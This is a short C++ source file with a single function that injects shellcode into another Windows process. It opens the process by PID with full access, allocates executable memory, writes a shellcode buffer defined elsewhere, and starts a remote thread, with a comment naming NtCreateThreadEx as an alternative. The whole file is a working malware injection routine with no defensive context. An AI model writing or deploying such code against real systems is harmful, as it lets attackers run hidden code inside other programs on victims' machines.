#include "inject.h"

auto inject_thread(DWORD const pid) -> bool
{
  auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  auto remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(g_shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(hProcess, remoteBuffer, g_shellcode, sizeof(g_shellcode), NULL);
  auto remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
  // Alternative: NtCreateThreadEx()
  CloseHandle(hProcess);
  return true;
}